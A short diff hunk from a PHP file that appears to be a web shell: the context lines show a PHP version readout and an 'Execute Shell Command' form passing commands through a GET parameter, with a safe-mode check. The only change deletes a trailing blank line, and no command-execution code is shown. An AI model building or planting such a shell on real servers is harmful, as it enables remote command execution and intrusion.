@@ -471,4 +471,3 @@ PHP Version: <?php echo PHP_VERSION ?><br />
 <pre><form action="" METHOD="GET" >Execute Shell Command (safe mode is <?php echo (@ini_get('safe_mode') ? 'on' : 'off') ?>): <input type="text" name="c"><input type="submit" value="Go"></form>  
 <?php 
 } 
-
